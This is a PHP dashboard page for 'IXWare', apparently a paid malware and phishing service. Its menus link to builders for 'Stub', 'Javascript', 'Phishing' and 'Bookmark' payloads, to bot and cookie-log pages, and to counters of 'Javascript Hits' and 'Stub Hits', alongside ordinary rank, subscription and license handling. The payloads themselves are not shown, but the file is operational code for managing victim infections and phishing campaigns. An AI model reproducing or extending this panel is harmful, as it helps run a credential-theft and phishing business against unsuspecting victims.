  <?php 
      @session_start();
      $title = 'Dashboard';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';
      include_once 'includes/email.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if (isset($_GET["activate"])){
        if(empty($_GET["activate"])){
            $error = 'You need to verify your e-mail address to get full access!';
        }
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
  ?>
  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link active" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Dashboard</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
              <?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->

  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
          <div class="col-xl-4">
            <div class="card dashboard-card bg-dark">
              <div class="card-body">
                  <div class="button">
                    <a class="btn-floating btn-lg float-right"><i class="fas fa-file-code"></i></a>
                  </div>
                  <h5 class="text-white mb-2 jscounter" id="js-hits">0</h5>
                  <p class="text-white font-weight-lighter">Javascript Hits</p>
              </div>
            </div>
          </div>
          <div class="col-xl-4">
              <div class="card dashboard-card bg-dark">
                <div class="card-body">
                    <div class="button">
                      <a class="btn-floating btn-lg float-right"><i class="fas fa-file-alt"></i></a>
                    </div>
                    <h5 class="text-white mb-2 jscounter" id="stub-hits">0</h5>
                    <p class="text-white font-weight-lighter">Stub Hits</p>
                </div>
              </div>
          </div>
          <div class="col-xl-4">
            <div class="card dashboard-card bg-dark">
              <div class="card-body">
                  <div class="button">
                    <a class="btn-floating btn-lg float-right"><i class="fas fa-users"></i></a>
                  </div>
                  <h5 class="text-white mb-2 jscounter" id="live-online">0</h5>
                  <p class="text-white font-weight-lighter">Online Users</p>
                </div>
            </div>
          </div>
      </div>
      <div class="row">
        <div class="col-xl-8">
          <?php
              $countryChanges = pdoQuery($db, "SELECT `countryChanges` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
              if($countryChanges >= 2){
                echo '<div class="alert alert-dismissible fade show ml-4" role="alert" data-color="warning">The System has detected too many location changes from you in the past.</div>';
              }
              if($discordID == 0){
                echo '<div class="alert alert-dismissible fade show ml-4" role="alert" data-color="danger">You need to update your discord ID to get full access to IXWare!</div>';
              }
              if(!empty($error)){
                echo '<div class="animated fadeIn ml-4">'.error(htmlspecialchars($error)).'</div>';
              }
              if(!empty($success)){
                echo '<div class="animated fadeIn ml-4">'.success(htmlspecialchars($success)).'</div>';
              }
            ?>
          <div class="card alert-card bg-dark">
            <div class="card-body">
                <h5 class="text-white mb-3">Important Informations</h5>
                <?php
                    $get = pdoQuery($db, "SELECT * FROM `news` LIMIT 3");
                    $results = $get->fetchAll(PDO::FETCH_ASSOC);
        
                  if ($get->rowCount() > 0) {

                    foreach($results as $result){

                        $title = htmlspecialchars($result['title']);
                        $main = htmlspecialchars($result['main']);
                        $author = htmlspecialchars($result['author']);
                        $date = htmlspecialchars($result['date']);

                        echo "<div class='alert alert-box-dashboard' role='alert' data-color='dark'>
                        <h4 class='alert-heading'>$title</h4>
                        <p>$main</p>
                        <hr />
                        <p class='mb-0'>~$author - <i class='text-muted'>$date</i></p></div>";

                    }
                  }else{
                    echo "<div class='alert alert-success alert-box-dashboard mr-3 mt-4' role='alert'>
                    <h4 class='alert-heading'>We have no updates for you!</h4>
                    <p>Today we don't have any important alerts for you!</p>
                    </div>";
                  }
                ?>
            </div>
          </div>
          <div class="card account-card bg-dark">
            <div class="card-body">
                <h5 class="text-white mb-2">Account Information</h5>
                <p class="mt-4 font-weight-lighter font-weight-bold text-darkwhite">Plan Details</p>
                  <?php
                    $endDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                    $subscription = pdoQuery($db, "SELECT `subscription` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                    $username = htmlspecialchars($_SESSION['username']);

                    echo "<p class='text-darkwhite'>Username: $username</p>";
                    if ($getRank == "Admin"){
                      echo "<p class='text-darkwhite'>Current Rank: <span class='badge bg-danger'>Administrator</span></h></p>";
                    }elseif($getRank == "User"){
                      echo "<p class='text-darkwhite'>Current Rank: <span class='badge bg-light text-dark'>Default</span></h></p>";
                    }elseif($getRank == "Premium"){
                      echo "<p class='text-darkwhite'>Current Rank: <span class='badge bg-warning text-dark'>Premium</span></h></p>";
                    }
                    if($subscription == "0"){
                      $subscription = "None";
                    }elseif($subscription == "Monthly"){
                      $subscription = "Monthly";
                    }elseif($subscription == "3Months"){
                      $subscription = "3 Months";
                    }
                    echo "<p class='text-darkwhite'>Subscription: $subscription</p>";
                    if($endDate != '0'){
                      $date = new DateTime($endDate);
                      $endDate = $date->format("D M d, Y G:i");
                      echo "<p class='text-darkwhite'>Expire Date: <h class='font-weight-bolder text-muted'>$endDate</h></p>";
                    }else{
                      echo "<p class='text-darkwhite'>Expire Date: <h class='font-weight-bolder text-muted'>No active subscription</h></p>";
                    }
                  ?>
            </div>
          </div>
        </div>
        <div class="col-xl-4">
          <div class="card news-card bg-dark table" style="display: table;word-break: break-word;">
            <div class="card-body">
            <h5 class="text-white">News</h5>
            <?php
              $get = pdoQuery($db, "SELECT * FROM `side_news` LIMIT 4");
              $results = $get->fetchAll(PDO::FETCH_ASSOC);
        
              if ($get->rowCount() > 0) {
                foreach($results as $result){
                  $date = htmlspecialchars($result['date']);
                  $content = htmlspecialchars($result['content']);

                  echo "<p class='mt-4 font-weight-lighter text-darkwhite'>$date</p>
                  <p>$content</p>
                  <hr />";
                }
                }else{
                  $date = date("Y-m-d H:i:s");
                  echo "<p class='mt-4 font-weight-bolder text-muted'>$date</p>
                  <p class='text-darkwhite'>No important news!</p>
                  <hr />";
                }
            ?>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
  <!--Main layout-->

  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>